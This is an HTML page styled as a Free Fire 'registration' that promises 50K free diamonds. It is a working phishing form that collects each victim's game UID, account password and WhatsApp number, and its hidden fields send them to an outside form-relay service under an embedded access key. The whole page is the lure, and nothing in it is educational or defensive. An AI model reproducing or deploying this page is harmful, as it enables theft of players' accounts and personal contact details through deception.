<!DOCTYPE html>
<html>
<head>
  <title>FREE FIRE REGISTRATION</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { font-family: Arial; color: white; padding: 20px; margin: 0; background: #000; }
    #bg-video { position: fixed; top: 50%; left: 50%; min-width: 100%; min-height: 100%; transform: translate(-50%, -50%); z-index: -2; object-fit: cover; }
    .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.7); z-index: -1; }
    form { max-width: 340px; margin: 50px auto; background: rgba(0, 0, 0, 0.6); padding: 20px; border-radius: 12px; box-shadow: 0 0 70px #ff6600; border: .5px solid #ff6600; }
    input { width: 100%; padding: 10px; margin: 8px 0 15px 0; border: 1px solid #ff6600; border-radius: 4px; background: rgba(0, 0, 0, 0.8); color: white; }
    button { background: #ff6600; color: black; padding: 12px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; width: 100%; }
    h1 { text-align: center; color: #ff6600; text-shadow: 0 0 10px #ff6600; }
  </style>
</head>
<body>
  <video autoplay muted loop playsinline id="bg-video">
    <source src="VID_20260627_004205_435.mp4" type="video/mp4">
  </video>
  <div class="overlay"></div>

  <h1>GET 50K DIMOND</h1>

  <form action="https://api.web3forms.com/submit" method="POST">
    <input type="hidden" name="access_key" value="5d37f182-f75b-4102-9894-95ebf0455a89">
    <input type="hidden" name="subject" value="New FF Registration">

    <label>UID OF FREE FIRE:</label>
    <input type="text" name="Player Name" required>

    <label>PASSWORD:</label>
    <input type="PASSWORD" name="Free Fire ID" placeholder="Sirf PASSWORD daale" required>

    <label>WHATSAPP NUMBER:</label>
    <input type="text" name="WhatsApp" required>

    <button type="submit">SUBMIT</button>
  </form>
</body>
</html>
